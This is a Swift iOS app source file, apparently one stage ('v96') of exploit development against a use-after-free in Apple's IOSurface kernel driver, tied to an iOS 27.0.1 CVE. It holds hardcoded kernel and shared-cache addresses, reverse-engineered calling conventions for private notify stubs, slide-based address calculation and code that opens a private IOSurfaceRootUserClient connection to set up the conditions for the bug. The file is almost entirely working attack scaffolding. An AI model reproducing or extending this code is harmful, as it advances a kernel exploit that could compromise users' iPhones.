// AGXProbe v96 - private IOSurfaceRootUserClient connection
//
// Goal: get NOT the shared IOSurfaceRoot connection, but our OWN
// IOServiceOpen()ed one, so that the per-connection notifier client can be
// destroyed on demand.  That is the object the notify request is bound to
// (request+0x58), and the 27.0.1 UAF is exactly "request outlives its bound
// notifier client".
//
// Static facts (see analysis/iosurface-notify-uaf-CVE-2026-112477.md):
//   IOSurfaceRootUserClient external methods live in __DATA_CONST of
//   com.apple.iokit.IOSurface, 40 bytes per entry, index == selector.
//     entry 0x11 fn 0xfffffe000a3498f4 = set surface notify
//           scalarIn=0 structIn=24 scalarOut=0 structOut=0
//     entry 0x12 fn 0xfffffe000a34991c = remove surface notify
//           scalarIn=0 structIn=24
//
// User space (dyld shared cache, IOSurface image):
//   _IOSurfaceClientSetSurfaceNotify     dsc vm 0x1c284a6e8
//   _IOSurfaceClientRemoveSurfaceNotify  dsc vm 0x1c2851390
//
// The framework reaches IOKit through two shared-cache "stub" functions
// (16-byte adrp/add/br/brk#1 thunks into another image):
//   set    -> 0x1c811c2b0  -> 0x18f08bc94
//   remove -> 0x1c810a5e0  -> 0x18f0717cc
//
// Their exact ABI was recovered from the framework call sites
// (_IOSurfaceClientSetSurfaceNotify / _IOSurfaceClientRemoveSurfaceNotify):
//
//   set(conn, 0x11, port, &in24, 3, 0, 0, &out24,
//       0x18, 0, 0, 0, 0)
//       x0 conn            x1 selector 0x11   x2 notify port
//       x3 &in24  = {0, type, surfaceID}      w4 = 3 (64-bit words)
//       x5 x6 = 0        x7 &out24 = {type, surfaceID, 0}
//       stack: 0x18 (out size), 0, 0, 0, 0
//
//   remove(conn, 0x12, 0, 0, &in24, 0x18, 0, 0, 0, 0)
//       x0 conn            x1 selector 0x12   x2 x3 = 0
//       x4 &in24 = {0, surfaceID, 0}         x5 = 0x18 (in size)
//       x6 x7 = 0
//       stack: 0, 0
//
// All images of one dyld shared cache share ONE slide, so the runtime address
// of the wrappers is derived from any known symbol in the cache:
//   runtime(x) = runtime(_IOSurfaceClientSetSurfaceNotify) + (x - 0x1c284a6e8)
// We then call the very same wrappers with OUR connection, so the kernel does
// exactly what it does for the framework - only on a private client.
//
// Everything below runs on the 13 Pro only.

import SwiftUI
import Darwin
import Foundation
import CoreFoundation

@main
struct AGXProbeApp: App {
    var body: some Scene { WindowGroup { ContentView() } }
}

struct ContentView: View {
    @StateObject private var vm = ReachViewModel()
    var body: some View {
        VStack(spacing: 12) {
            Text("AGXProbe v96 - private IOSurface conn").font(.headline)
            ScrollView {
                Text(vm.log)
                    .font(.system(size: 9, design: .monospaced))
                    .foregroundColor(.green)
                    .frame(maxWidth: .infinity, alignment: .leading)
                    .padding(6).background(Color.black.opacity(0.85)).cornerRadius(6)
            }
            Button(action: { Task { await vm.runProbe() } }) {
                Text(vm.isRunning ? "Probing..." : "Run v96")
                    .font(.headline).foregroundColor(.white)
                    .frame(maxWidth: .infinity).padding(10)
                    .background(vm.isRunning ? Color.gray : Color.blue).cornerRadius(8)
            }.disabled(vm.isRunning)
            Text("Status: \(vm.status)").font(.caption2).foregroundColor(.secondary)
            Spacer(minLength: 0)
        }
        .padding().task { await vm.autoRunIfRequested() }
    }
}

@MainActor
final class ReachViewModel: ObservableObject {
    @Published var log = ""
    @Published var status = "Ready"
    @Published var isRunning = false
    private var didAutoRun = false

    private let logFileURL: URL = {
        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
            .appendingPathComponent("reach.log")
    }()

    private func emit(_ m: String) {
        log += m + "\n"; print(m); fflush(stdout)
        try? log.write(to: logFileURL, atomically: true, encoding: .utf8)
    }

    func autoRunIfRequested() async {
        guard !didAutoRun else { return }
        didAutoRun = true
        if ProcessInfo.processInfo.arguments.contains("--autorun") { await runProbe() }
    }

    // set(conn, sel, port, &in24, words, x5, x6, &out24, outSize, s1, s2, s3, s4)
    typealias SetWrap = @convention(c) (UInt32, UInt32, UInt64, UnsafeRawPointer?, UInt32,
                                        UInt64, UInt64, UnsafeRawPointer?,
                                        UInt64, UInt64, UInt64, UInt64, UInt64) -> Int32
    // remove(conn, sel, x2, x3, &in24, inSize, x6, x7, s0, s1)
    typealias RemWrap = @convention(c) (UInt32, UInt32, UInt64, UInt64, UnsafeRawPointer?,
                                        UInt64, UInt64, UInt64, UInt64, UInt64) -> Int32

    typealias SetNotifyFn = @convention(c) (mach_port_t, UInt64, UInt64) -> kern_return_t
    typealias RemoveNotifyFn = @convention(c) (UInt64) -> kern_return_t
    typealias CreateFn = @convention(c) (CFDictionary) -> UnsafeMutableRawPointer?
    typealias GetIDFn = @convention(c) (UnsafeMutableRawPointer) -> UInt32

    func runProbe() async {
        isRunning = true; status = "Probing..."; log = ""
        try? "".write(to: logFileURL, atomically: true, encoding: .utf8)
        emit("=== AGXProbe v96 - private IOSurfaceRootUserClient ===")
        try? await Task.sleep(nanoseconds: 2_000_000_000)

        guard let fwH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW),
              let setSym = dlsym(fwH, "IOSurfaceClientSetSurfaceNotify"),
              let remSym = dlsym(fwH, "IOSurfaceClientRemoveSurfaceNotify"),
              let createSym = dlsym(fwH, "IOSurfaceCreate"),
              let getIdSym = dlsym(fwH, "IOSurfaceGetID") else {
            emit("[-] dlsym fail"); status = "Complete"; isRunning = false; return
        }
        let gSet = unsafeBitCast(setSym, to: SetNotifyFn.self)
        let gRemove = unsafeBitCast(remSym, to: RemoveNotifyFn.self)
        let gCreate = unsafeBitCast(createSym, to: CreateFn.self)
        let gGetID = unsafeBitCast(getIdSym, to: GetIDFn.self)

        func krName(_ kr: Int32) -> String {
            switch kr {
            case KERN_SUCCESS: return "OK"
            case Int32(bitPattern: 0xe00002bd): return "NoMemory"
            case Int32(bitPattern: 0xe00002c2): return "BadArgument"
            case Int32(bitPattern: 0xe00002c9): return "Duplicate/Exists"
            case Int32(bitPattern: 0xe00002d8): return "NotAttached(27.2 guard)"
            default: return String(format: "0x%08x", UInt32(bitPattern: kr))
            }
        }
        func makeSurface(w: Int, h: Int) -> UnsafeMutableRawPointer? {
            var keyCB = kCFTypeDictionaryKeyCallBacks
            var valCB = kCFTypeDictionaryValueCallBacks
            let props = CFDictionaryCreateMutable(nil, 0, &keyCB, &valCB) as! NSMutableDictionary
            props["IOSurfaceWidth"] = w
            props["IOSurfaceHeight"] = h
            props["IOSurfaceBytesPerElement"] = 4
            return gCreate(props)
        }
        func hex(_ p: UnsafeRawPointer, _ n: Int) -> String {
            let b = p.assumingMemoryBound(to: UInt8.self)
            var s = ""
            for i in 0..<n { s += String(format: "%02x ", b[i]) }
            return s
        }

        // ---- 1. locate the shared-cache wrappers -------------------------------
        emit("\n=== 1. shared-cache wrapper addresses ===")
        var infoIOS = Dl_info()
        _ = dladdr(setSym, &infoIOS)

        let dscSetSym = UInt64(0x1c284a6e8)
        let dscSetWrap = UInt64(0x1c811c2b0)
        let dscRemWrap = UInt64(0x1c810a5e0)

        guard infoIOS.dli_saddr != nil else {
            emit("[-] dladdr failed for IOSurfaceClientSetSurfaceNotify")
            status = "Complete"; isRunning = false; return
        }
        let runtimeSetSym = unsafeBitCast(infoIOS.dli_saddr!, to: UInt64.self)
        let runtimeBase = unsafeBitCast(infoIOS.dli_fbase!, to: UInt64.self)
        emit("IOSurface image base  = 0x\(String(runtimeBase, radix: 16))")
        emit("set_notify runtime   = 0x\(String(runtimeSetSym, radix: 16))")

        let setWrapAddr = runtimeSetSym &+ (dscSetWrap &- dscSetSym)
        let remWrapAddr = runtimeSetSym &+ (dscRemWrap &- dscSetSym)
        emit("computed set wrapper = 0x\(String(setWrapAddr, radix: 16))   (dsc 0x1c811c2b0)")
        emit("computed rem wrapper = 0x\(String(remWrapAddr, radix: 16))   (dsc 0x1c810a5e0)")

        // safety: the stubs are slide invariant (adrp/add are PC relative), so the
        // runtime bytes must match the static bytes exactly.
        let expectedSetStub: [UInt8] = [0x70, 0x7b, 0xe3, 0xf0, 0x10, 0x52, 0x32, 0x91,
                                        0x00, 0x02, 0x1f, 0xd6, 0x20, 0x00, 0x20, 0xd4]
        let expectedRemStub: [UInt8] = [0x30, 0x7b, 0xe3, 0xf0, 0x10, 0x32, 0x1f, 0x91,
                                        0x00, 0x02, 0x1f, 0xd6, 0x20, 0x00, 0x20, 0xd4]
        func checkStub(_ addr: UInt64, _ expected: [UInt8], _ label: String) -> Bool {
            guard let p = UnsafeRawPointer(bitPattern: Int(bitPattern: UInt(truncatingIfNeeded: addr))) else {
                emit("[-] \(label) address not representable"); return false
            }
            let got = [UInt8](UnsafeRawBufferPointer(start: p, count: expected.count))
            let ok = got == expected
            let expHex = expected.map { String(format: "%02x", $0) }.joined(separator: " ")
            emit("[\(label)] stub bytes \(ok ? "MATCH" : "MISMATCH"): \(hex(p, expected.count))")
            if !ok { emit("     expected:                   \(expHex)") }
            return ok
        }
        let setOK = checkStub(setWrapAddr, expectedSetStub, "set")
        let remOK = checkStub(remWrapAddr, expectedRemStub, "remove")
        guard setOK && remOK else {
            emit("[-] wrapper address verification failed - aborting before any call")
            status = "Complete"; isRunning = false; return
        }

        // ---- 2. open our own IOSurfaceRootUserClient --------------------------
        emit("\n=== 2. open private IOSurfaceRootUserClient ===")
        var iter: io_iterator_t = 0
        let matchName = "IOSurfaceRoot"
        var kr: Int32 = matchName.withCString {
            xq_IOServiceGetMatchingServices(mach_task_self(), xq_IOServiceMatching($0), &iter)
        }
        emit("IOServiceGetMatchingServices -> \(krName(kr))")
        guard kr == KERN_SUCCESS else { status = "Complete"; isRunning = false; return }
        let svc = xq_IOIteratorNext(iter)
        emit("service = 0x\(String(svc, radix: 16))")
        var conn: io_connect_t = 0
        kr = xq_IOServiceOpen(svc, mach_task_self(), 0, &conn)
        emit("IOServiceOpen -> \(krName(kr)) conn=0x\(String(conn, radix: 16))")
        guard kr == KERN_SUCCESS else { status = "Complete"; isRunning = false; return }

        // ---- 3. notify port ----------------------------------------------------
        var port: mach_port_t = 0
        kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port)
        emit("notify port 0x\(String(port, radix: 16)) kr=\(krName(kr))")
        guard kr == KERN_SUCCESS else { status = "Complete"; isRunning = false; return }

        // ---- 4. control: shared connection ------------------------------------
        emit("\n=== 4. control - shared connection (public API) ===")
        guard let s0 = makeSurface(w: 64, h: 64) else {
            emit("[-] create failed"); status = "Complete"; isRunning = false; return
        }
        let id0 = gGetID(s0)
        emit("[shared] surface id 0x\(String(id0, radix: 16))")
        emit("[shared] set(port,1,id) -> \(krName(gSet(port, 1, UInt64(id0))))")
        emit("[shared] remove(id)   -> \(krName(gRemove(UInt64(id0))))")
        Unmanaged<AnyObject>.fromOpaque(s0).release()

        // ---- 5. private connection: set / remove ------------------------------
        emit("\n=== 5. private connection - set/remove via shared-cache wrapper ===")
        guard let s1 = makeSurface(w: 80, h: 80) else {
            emit("[-] create failed"); status = "Complete"; isRunning = false; return
        }
        let id1 = gGetID(s1)
        emit("[priv] surface id 0x\(String(id1, radix: 16))")

        let setWrap = unsafeBitCast(setWrapAddr, to: SetWrap.self)
        let remWrap = unsafeBitCast(remWrapAddr, to: RemWrap.self)

        // framework layout: in24 = {0, type, surfaceID}, out24 = {type, surfaceID, 0}
        var inSet: (UInt64, UInt64, UInt64) = (0, 1, UInt64(id1))
        var outSet: (UInt64, UInt64, UInt64) = (1, UInt64(id1), 0)
        let krSet: Int32 = withUnsafePointer(to: &inSet) { ip in
            withUnsafePointer(to: &outSet) { op in
                setWrap(conn, 0x11, UInt64(port), UnsafeRawPointer(ip), 3, 0, 0,
                        UnsafeRawPointer(op), 0x18, 0, 0, 0, 0)
            }
        }
        emit("[priv] set wrapper   -> \(krName(krSet))   out=(\(outSet.0),\(outSet.1),\(outSet.2))")

        // remove layout: in24 = {0, surfaceID, 0}
        var inRem: (UInt64, UInt64, UInt64) = (0, UInt64(id1), 0)
        let krRem: Int32 = withUnsafePointer(to: &inRem) { ip in
            remWrap(conn, 0x12, 0, 0, UnsafeRawPointer(ip), 0x18, 0, 0, 0, 0)
        }
        emit("[priv] remove wrapper -> \(krName(krRem))")

        let krRem2: Int32 = withUnsafePointer(to: &inRem) { ip in
            remWrap(conn, 0x12, 0, 0, UnsafeRawPointer(ip), 0x18, 0, 0, 0, 0)
        }
        emit("[priv] remove again   -> \(krName(krRem2))  (BadArgument == nothing was registered)")

        // ---- 6. cross-check: the shared connection must NOT see it -----------
        emit("\n=== 6. cross-check ===")
        emit("[shared] remove(id1) on the private-registered id -> \(krName(gRemove(UInt64(id1))))")
        emit("[shared] set(port,1,id1) -> \(krName(gSet(port, 1, UInt64(id1))))")
        emit("[shared] remove(id1)    -> \(krName(gRemove(UInt64(id1))))")

        Unmanaged<AnyObject>.fromOpaque(s1).release()
        _ = xq_IOServiceClose(conn)
        emit("\n[priv] connection closed")
        emit("\n=== done ===")
        status = "Complete"; isRunning = false
    }
}

// mach_task_self is not exposed by the Darwin module on iOS
@_silgen_name("mach_task_self")
func mach_task_self() -> mach_port_t
